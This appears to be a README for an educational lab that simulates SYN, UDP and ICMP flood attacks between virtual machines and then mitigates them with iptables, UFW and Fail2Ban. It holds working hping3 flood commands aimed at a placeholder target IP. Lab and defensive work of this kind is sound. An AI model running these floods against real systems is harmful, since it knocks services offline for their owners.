# Denial-of-Service (DoS) Attack Simulation

## Overview
This project demonstrates a **Denial-of-Service (DoS) attack simulation** in a controlled environment using Virtual Machines (VMs). The simulation includes **SYN Flood, UDP Flood, and ICMP Flood attacks** on a target VM while implementing firewall-based mitigation strategies.

⚠ **Disclaimer:** This project is for **educational and research purposes only**. Do not use these techniques on unauthorized systems. Unauthorized use may result in legal consequences.

![DoS Attack Diagram](https://upload.wikimedia.org/wikipedia/commons/1/19/Denial_of_service_attack.svg)

---

## Setting Up the Environment
### **1. Virtual Machine Configuration**
- **Run 3 VMs** simultaneously:
  - **2 Attacker VMs** (Kali Linux or Ubuntu with `hping3` installed)
  - **1 Victim VM** (Ubuntu or any Linux-based OS)
- Configure network settings to allow communication between VMs.
- Install necessary tools on each VM:
  ```bash
  sudo apt update && sudo apt install hping3 ufw iptables wireshark -y
  ```

### **2. Checking Network Connectivity**
Run the following command from an attacker VM to verify connectivity with the target VM:
```bash
ping <target-ip>
```

---

## Attack Simulations
### **1. SYN Flood Attack**
```bash
sudo hping3 -S --flood -p 80 <target-ip>
```
- `-S` → Sends SYN packets.
- `--flood` → Sends packets continuously.
- `-p 80` → Targets port 80 (HTTP service).

### **2. UDP Flood Attack**
```bash
sudo hping3 --udp --flood -p 53 <target-ip>
```
- `--udp` → Sends UDP packets.
- `--flood` → Sends packets continuously.
- `-p 53` → Targets port 53 (DNS service).

### **3. ICMP (Ping) Flood Attack**
```bash
sudo hping3 --icmp --flood <target-ip>
```
- `--icmp` → Sends ICMP Echo Request packets.
- `--flood` → Sends packets continuously.

---

## Observing Attack Effects with Wireshark
Wireshark can be used to analyze the attack's impact:
1. **SYN Flood Attack:**
   - Multiple SYN packets sent to the target VM.
   - Increased CPU and memory usage.
   - Many connections stuck in `SYN_RECV` state.
2. **UDP Flood Attack:**
   - High volume of UDP packets observed.
   - Increased bandwidth consumption.
   - Empty UDP packets flooding the network.
3. **ICMP Flood Attack:**
   - Large number of ping requests from attacker.
   - High network latency and packet congestion.

---

## Mitigation Techniques
### **1. Using UFW Firewall**
```bash
sudo ufw deny from <attacker-ip>
sudo ufw enable
sudo ufw status
```
- Blocks all incoming traffic from the attacker's IP.
- Ensures firewall protection is active.

### **2. Using iptables Firewall**
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 5 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
sudo iptables -A INPUT -p udp -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
sudo iptables-save > /etc/iptables.rules
```
- Rate limits SYN, UDP, and ICMP floods.
- Drops excessive attack packets to prevent system overload.

---

## Automating Mitigation
Save the following **Bash script** as `block_attacks.sh`:
```bash
#!/bin/bash

echo "[+] Applying Firewall Rules to Prevent DoS Attacks..."

# Flush existing rules
sudo iptables -F

# Prevent SYN Flood (TCP)
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 5 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# Prevent UDP Flood
sudo iptables -A INPUT -p udp -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP

# Prevent ICMP Flood (Ping)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Save rules
sudo iptables-save > /etc/iptables.rules

echo "[+] Firewall rules applied successfully!"
```
To execute the script:
```bash
chmod +x block_attacks.sh
sudo ./block_attacks.sh
```

To make the rules persistent after a reboot, install the persistence package:
```bash
sudo apt install iptables-persistent
sudo systemctl enable netfilter-persistent
```

---

## **Results: Before & After Mitigation**
| Attack Type | Before Mitigation | After Mitigation |
|------------|------------------|-----------------|
| SYN Flood | High CPU Usage, Many SYN_RECV States | Limited Connections, No Overload |
| UDP Flood | High Bandwidth Consumption | Rate-Limited Traffic |
| ICMP Flood | Increased Latency | Reduced ICMP Requests |

---

## **Additional Security Measures**
- **Install Fail2Ban** to detect and block malicious IPs:
  ```bash
  sudo apt install fail2ban -y
  sudo systemctl start fail2ban
  sudo systemctl enable fail2ban
  ```
- **Use Cloud-Based DDoS Protection** (e.g., Cloudflare, AWS Shield, etc.).
- **Implement an Intrusion Detection System (IDS)** such as **Snort or Suricata**.

---

## **Conclusion**
This project demonstrates the impact of **DoS attacks** and how to mitigate them using **firewall rules and automation scripts**. Implementing **IDS, IP tracking, and cloud security solutions** further enhances protection against network attacks.

---

## **References**
- [hping3 Documentation](http://www.hping.org/)
- [Wireshark Network Analysis](https://www.wireshark.org/)
- [Linux iptables Firewall](https://linux.die.net/man/8/iptables)
- [UFW Firewall Guide](https://help.ubuntu.com/community/UFW)

